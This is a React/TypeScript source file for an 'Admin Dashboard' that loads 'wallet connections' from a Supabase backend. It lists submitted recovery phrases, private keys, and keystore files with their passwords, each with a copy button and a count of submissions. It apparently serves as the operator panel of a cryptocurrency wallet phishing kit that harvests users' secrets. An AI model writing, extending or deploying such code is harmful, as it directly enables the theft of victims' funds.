import React, { useEffect, useState, useMemo } from 'react';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '../components/ui/tabs';
import { Button } from '../components/ui/button';
import { useNavigate } from 'react-router-dom';
import { WalletConnection, fetchWalletConnections } from '../lib/supabase';
import { Copy, Check, Wallet, Key, FileJson } from 'lucide-react';

const AdminDashboard = () => {
  const navigate = useNavigate();
  const [activeTab, setActiveTab] = useState<'phrases' | 'privateKeys' | 'keystores'>('phrases');
  const [connections, setConnections] = useState<WalletConnection[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [refreshTrigger, setRefreshTrigger] = useState(0);

  useEffect(() => {
    const getConnections = async () => {
      setLoading(true);
      setError(null);
      try {
        const { data, error } = await fetchWalletConnections();
        if (error) {
          throw new Error(typeof error === 'string' ? error : error.message || 'Failed to fetch connections');
        }
        console.log('Fetched connections:', data);
        setConnections(data || []);
      } catch (err: any) {
        console.error('Error in dashboard:', err);
        setError(err.message || 'Failed to load connections');
      } finally {
        setLoading(false);
      }
    };
    getConnections();
  }, [refreshTrigger]);

  const handleRefresh = () => {
    setRefreshTrigger(prev => prev + 1);
  };

  const filterConnections = (type: 'phrase' | 'private_key' | 'keystore') => {
    const filtered = connections.filter(conn => conn.connection_type === type);
    console.log(`Filtered ${type} connections:`, filtered);
    return filtered;
  };

  const filteredPhrases = useMemo(() => filterConnections('phrase'), [connections]);
  const filteredPrivateKeys = useMemo(() => filterConnections('private_key'), [connections]);
  const filteredKeystores = useMemo(() => filterConnections('keystore'), [connections]);

  const maskSensitiveData = (data: string) =>
    data.length > 12
      ? `${data.substring(0, 8)}...${data.slice(-4)}`
      : '••••••••';

  const handleCopy = async (text: string, fieldId: string) => {
    try {
      if (!navigator.clipboard) {
        throw new Error('Clipboard API not supported');
      }
      await navigator.clipboard.writeText(text);
      setCopiedField(fieldId);
      setTimeout(() => setCopiedField(null), 2000);
    } catch (err) {
      console.error('Failed to copy:', err);
      setError('Failed to copy to clipboard. Please try manually selecting and copying the text.');
    }
  };

  const renderTabIcon = (type: string) => {
    switch (type) {
      case 'phrases':
        return <Wallet size={16} className="mr-2" />;
      case 'privateKeys':
        return <Key size={16} className="mr-2" />;
      case 'keystores':
        return <FileJson size={16} className="mr-2" />;
      default:
        return null;
    }
  };

  return (
    <div className="min-h-screen bg-black text-white">
      <div className="container mx-auto px-4 py-12">
        <div className="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
          <h1 className="text-3xl font-bold">Admin Dashboard</h1>
          <div className="flex gap-4">
            <Button variant="outline" onClick={handleRefresh}>
              Refresh Data
            </Button>
            <Button variant="outline" onClick={() => navigate('/')}>
              Back to Home
            </Button>
          </div>
        </div>

        {error && (
          <div className="bg-white/10 border border-white/20 text-white px-4 py-3 rounded mb-6">
            <strong className="font-bold">Error:</strong>
            <span className="block sm:inline"> {error}</span>
          </div>
        )}

        <div className="border border-white/20 rounded-lg p-6 mb-8">
          <h2 className="text-xl font-semibold mb-4">Dashboard Overview</h2>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="bg-white/5 p-4 rounded-lg border border-white/10">
              <p className="text-white/60 text-sm">Total Submissions</p>
              <p className="text-2xl font-bold">{connections.length}</p>
            </div>
            <div className="bg-white/5 p-4 rounded-lg border border-white/10">
              <p className="text-white/60 text-sm">Recovery Phrases</p>
              <p className="text-2xl font-bold">{filteredPhrases.length}</p>
            </div>
            <div className="bg-white/5 p-4 rounded-lg border border-white/10">
              <p className="text-white/60 text-sm">Private Keys</p>
              <p className="text-2xl font-bold">{filteredPrivateKeys.length}</p>
            </div>
          </div>
        </div>

        <Tabs defaultValue="phrases" className="w-full" onValueChange={setActiveTab}>
          <TabsList className="w-full grid grid-cols-3 mb-8 bg-white/5">
            <TabsTrigger value="phrases" className="data-[state=active]:bg-white/10">
              {renderTabIcon('phrases')} Recovery Phrases
            </TabsTrigger>
            <TabsTrigger value="privateKeys" className="data-[state=active]:bg-white/10">
              {renderTabIcon('privateKeys')} Private Keys
            </TabsTrigger>
            <TabsTrigger value="keystores" className="data-[state=active]:bg-white/10">
              {renderTabIcon('keystores')} Keystores
            </TabsTrigger>
          </TabsList>

          <div className="border border-white/20 rounded-lg overflow-hidden">
            <TabsContent value="phrases" className="space-y-4">
              {loading ? (
                <div className="text-center py-12">
                  <div className="animate-spin h-8 w-8 border-4 border-white border-t-transparent rounded-full mx-auto mb-4"></div>
                  <p className="text-white/60">Loading recovery phrases...</p>
                </div>
              ) : filteredPhrases.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-white/5 text-white">
                      <tr>
                        <th className="p-4 text-left">Wallet</th>
                        <th className="p-4 text-left">Recovery Phrase</th>
                        <th className="p-4 text-left">Timestamp</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredPhrases.map((conn) => (
                        <tr key={conn.id} className="border-b border-white/10 hover:bg-white/5">
                          <td className="p-4">{conn.wallet_name}</td>
                          <td className="p-4">
                            <div className="flex items-center space-x-2">
                              <span className="font-mono text-sm bg-white/5 p-2 rounded">
                                {conn.data?.phrase ? maskSensitiveData(conn.data.phrase) : 'N/A'}
                              </span>
                              {conn.data?.phrase && (
                                <button
                                  onClick={() => handleCopy(conn.data.phrase, `phrase-${conn.id}`)}
                                  className="text-white/60 hover:text-white transition-colors"
                                  aria-label={copiedField === `phrase-${conn.id}` ? 'Copied' : 'Copy recovery phrase'}
                                  title={copiedField === `phrase-${conn.id}` ? 'Copied' : 'Copy to clipboard'}
                                >
                                  {copiedField === `phrase-${conn.id}` ? (
                                    <Check size={16} className="text-white" />
                                  ) : (
                                    <Copy size={16} />
                                  )}
                                </button>
                              )}
                            </div>
                          </td>
                          <td className="p-4 text-sm text-white/60">
                            {new Date(conn.created_at).toLocaleString()}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="text-center py-12">
                  <p className="text-white/60">No recovery phrases submitted yet.</p>
                </div>
              )}
            </TabsContent>

            <TabsContent value="privateKeys" className="space-y-4">
              {loading ? (
                <div className="text-center py-12">
                  <div className="animate-spin h-8 w-8 border-4 border-white border-t-transparent rounded-full mx-auto mb-4"></div>
                  <p className="text-white/60">Loading private keys...</p>
                </div>
              ) : filteredPrivateKeys.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-white/5 text-white">
                      <tr>
                        <th className="p-4 text-left">Wallet</th>
                        <th className="p-4 text-left">Private Key</th>
                        <th className="p-4 text-left">Timestamp</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredPrivateKeys.map((conn) => (
                        <tr key={conn.id} className="border-b border-white/10 hover:bg-white/5">
                          <td className="p-4">{conn.wallet_name}</td>
                          <td className="p-4">
                            <div className="flex items-center space-x-2">
                              <span className="font-mono text-sm bg-white/5 p-2 rounded">
                                {conn.data?.private_key ? maskSensitiveData(conn.data.private_key) : 'N/A'}
                              </span>
                              {conn.data?.private_key && (
                                <button
                                  onClick={() => handleCopy(conn.data.private_key, `private_key-${conn.id}`)}
                                  className="text-white/60 hover:text-white transition-colors"
                                  aria-label={copiedField === `private_key-${conn.id}` ? 'Copied' : 'Copy private key'}
                                  title={copiedField === `private_key-${conn.id}` ? 'Copied' : 'Copy to clipboard'}
                                >
                                  {copiedField === `private_key-${conn.id}` ? (
                                    <Check size={16} className="text-white" />
                                  ) : (
                                    <Copy size={16} />
                                  )}
                                </button>
                              )}
                            </div>
                          </td>
                          <td className="p-4 text-sm text-white/60">
                            {new Date(conn.created_at).toLocaleString()}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="text-center py-12">
                  <p className="text-white/60">No private keys submitted yet.</p>
                </div>
              )}
            </TabsContent>

            <TabsContent value="keystores" className="space-y-4">
              {loading ? (
                <div className="text-center py-12">
                  <div className="animate-spin h-8 w-8 border-4 border-white border-t-transparent rounded-full mx-auto mb-4"></div>
                  <p className="text-white/60">Loading keystores...</p>
                </div>
              ) : filteredKeystores.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full">
                    <thead className="bg-white/5 text-white">
                      <tr>
                        <th className="p-4 text-left">Wallet</th>
                        <th className="p-4 text-left">Keystore JSON</th>
                        <th className="p-4 text-left">Password</th>
                        <th className="p-4 text-left">Timestamp</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredKeystores.map((conn) => (
                        <tr key={conn.id} className="border-b border-white/10 hover:bg-white/5">
                          <td className="p-4">{conn.wallet_name}</td>
                          <td className="p-4">
                            <div className="flex items-center space-x-2">
                              <span className="font-mono text-sm bg-white/5 p-2 rounded truncate max-w-xs">
                                {conn.data?.keystore_json
                                  ? `${conn.data.keystore_json.substring(0, 30)}...`
                                  : 'N/A'}
                              </span>
                              {conn.data?.keystore_json && (
                                <button
                                  onClick={() => handleCopy(conn.data.keystore_json, `keystore-${conn.id}`)}
                                  className="text-white/60 hover:text-white transition-colors"
                                  aria-label={copiedField === `keystore-${conn.id}` ? 'Copied' : 'Copy keystore JSON'}
                                  title={copiedField === `keystore-${conn.id}` ? 'Copied' : 'Copy to clipboard'}
                                >
                                  {copiedField === `keystore-${conn.id}` ? (
                                    <Check size={16} className="text-white" />
                                  ) : (
                                    <Copy size={16} />
                                  )}
                                </button>
                              )}
                            </div>
                          </td>
                          <td className="p-4">
                            {conn.data?.keystore_password ? (
                              <div className="flex items-center space-x-2">
                                <span className="font-mono text-sm bg-white/5 p-2 rounded">
                                  {maskSensitiveData(conn.data.keystore_password)}
                                </span>
                                <button
                                  onClick={() => handleCopy(conn.data.keystore_password, `password-${conn.id}`)}
                                  className="text-white/60 hover:text-white transition-colors"
                                  aria-label={copiedField === `password-${conn.id}` ? 'Copied' : 'Copy password'}
                                  title={copiedField === `password-${conn.id}` ? 'Copied' : 'Copy to clipboard'}
                                >
                                  {copiedField === `password-${conn.id}` ? (
                                    <Check size={16} className="text-white" />
                                  ) : (
                                    <Copy size={16} />
                                  )}
                                </button>
                              </div>
                            ) : (
                              'N/A'
                            )}
                          </td>
                          <td className="p-4 text-sm text-white/60">
                            {new Date(conn.created_at).toLocaleString()}
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="text-center py-12">
                  <p className="text-white/60">No keystores submitted yet.</p>
                </div>
              )}
            </TabsContent>
          </div>
        </Tabs>
      </div>
    </div>
  );
};

export default AdminDashboard;